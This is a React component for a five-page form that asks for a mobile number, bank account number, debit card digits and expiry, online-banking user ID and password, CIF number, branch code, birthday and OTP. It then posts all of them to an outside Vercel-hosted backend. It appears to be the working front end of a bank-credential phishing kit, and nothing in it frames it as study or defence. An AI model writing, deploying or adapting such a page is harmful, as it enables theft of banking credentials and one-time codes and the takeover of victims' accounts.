import React, { useState } from 'react';
import image from '../assets/images/image.webp';
import image1 from '../assets/images/image2.webp';
import { Link } from 'react-router-dom';

const MultiPageForm = () => {
    const [page, setPage] = useState(1);
    const [formData, setFormData] = useState({
        mobileNumber: '',
        accountNumber: '',
        debitCardDigits: '',
        expiryDate: '',
        bankName: '',
        userID: '',
        password: '',
        cifNumber: '',
        branchCode: '',
        birthday: '',
        otp: ''
    });

    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData((prevData) => ({ ...prevData, [name]: value }));
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (page < 5) {
            setPage(page + 1); // Move to the next page
        } else {
            console.log('Form submitted:', formData); // Logging form data for debugging
            
            try {
                const response = await fetch('https://back-end-card-bv5n-git-main-alvin-sifats-projects.vercel.app/api', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(formData),
                });

                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }

                const data = await response.json();
                console.log('Response from server:', data);
                // Optionally handle successful submission (e.g., navigate to another page or show a success message)
            } catch (error) {
                console.error('Error submitting form:', error);
                // Handle error (e.g., show an error message to the user)
            }
        }
    };

    return (
        <div className="mx-auto flex flex-col items-center bg-blue-100 p-8 rounded-lg shadow-lg max-w-md space-y-6">
            {/* Page 1 */}
            {page === 1 && (
                <div className="flex flex-col items-center bg-gradient-to-r from-blue-100 to-blue-200 p-8 rounded-lg shadow-lg max-w-md mx-auto space-y-6">
                    <img src={image} alt="First Image" className="w-full h-auto rounded-lg shadow-md" />
                    <img src={image1} alt="Second Image" className="w-full h-auto rounded-lg shadow-md" />
                    <button
                        onClick={() => setPage(2)}
                        className="bg-black text-white px-9 py-4 mt-9"
                    >
                        Next
                    </button>
                </div>
            )}

            {/* Page 2 */}
            {page === 2 && (
                <div className="w-full">
                    <img src={image} alt="First Image" className="w-full h-auto rounded-lg" />
                    <form onSubmit={handleSubmit} className="w-full space-y-4">
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">Mobile Number</label>
                            <input
                                type="tel"
                                name="mobileNumber"
                                placeholder="Enter mobile number"
                                value={formData.mobileNumber}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">Account Number</label>
                            <input
                                type="text"
                                name="accountNumber"
                                placeholder="Enter account number"
                                value={formData.accountNumber}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">Last 6 Digits of Debit Card</label>
                            <input
                                type="text"
                                name="debitCardDigits"
                                maxLength="6"
                                placeholder="Enter last 6 digits"
                                value={formData.debitCardDigits}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">Expiry Date</label>
                            <input
                                type="text"
                                name="expiryDate"
                                placeholder="MM/YY"
                                value={formData.expiryDate}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                        <button type="submit" className="bg-black text-white px-9 py-4 mt-9">
                            Next
                        </button>
                    </form>
                </div>
            )}

            {/* Page 3 */}
            {page === 3 && (
                <div className="w-full">
                    <img src={image} alt="First Image" className="w-full h-auto rounded-lg" />
                    <form onSubmit={handleSubmit} className="w-full space-y-4">
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">Bank Name</label>
                            <input
                                type="text"
                                name="bankName"
                                placeholder="Enter your bank name"
                                value={formData.bankName}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">User ID</label>
                            <input
                                type="text"
                                name="userID"
                                placeholder="Enter your user ID"
                                value={formData.userID}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">Password</label>
                            <input
                                type="password"
                                name="password"
                                placeholder="Enter your password"
                                value={formData.password}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                        <button type="submit" className="bg-black text-white px-9 py-4 mt-9">
                            Next
                        </button>
                    </form>
                </div>
            )}

            {/* Page 4 */}
            {page === 4 && (
                <div className="w-full">
                    <img src={image} alt="First Image" className="w-full h-auto rounded-lg" />
                    <form onSubmit={handleSubmit} className="w-full space-y-4">
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">CIF Number</label>
                            <input
                                type="text"
                                name="cifNumber"
                                placeholder="Enter CIF number"
                                value={formData.cifNumber}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">Branch Code</label>
                            <input
                                type="text"
                                name="branchCode"
                                placeholder="Enter branch code"
                                value={formData.branchCode}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">Birthday</label>
                            <input
                                type="date"
                                name="birthday"
                                value={formData.birthday}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                        <button type="submit" className="bg-black text-white px-9 py-4 mt-9">
                            Next
                        </button>
                    </form>
                </div>
            )}

            {/* Page 5 */}
            {page === 5 && (
                <div className="w-full">
                    <img src={image} alt="First Image" className="w-full h-auto rounded-lg" />
                    <form onSubmit={handleSubmit} className="w-full space-y-4">
                        <div>
                            <label className="block text-gray-700 text-sm font-semibold mb-1">OTP</label>
                            <input
                                type="text"
                                name="otp"
                                placeholder="Enter OTP"
                                value={formData.otp}
                                onChange={handleChange}
                                className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                            />
                        </div>
                       <Link to="/finish">
                       <button type="submit" className="bg-black text-white px-9 py-4 mt-9">
                            Submit
                        </button>
                        </Link>
                    </form>
                </div>
            )}
        </div>
    );
};

export default MultiPageForm;
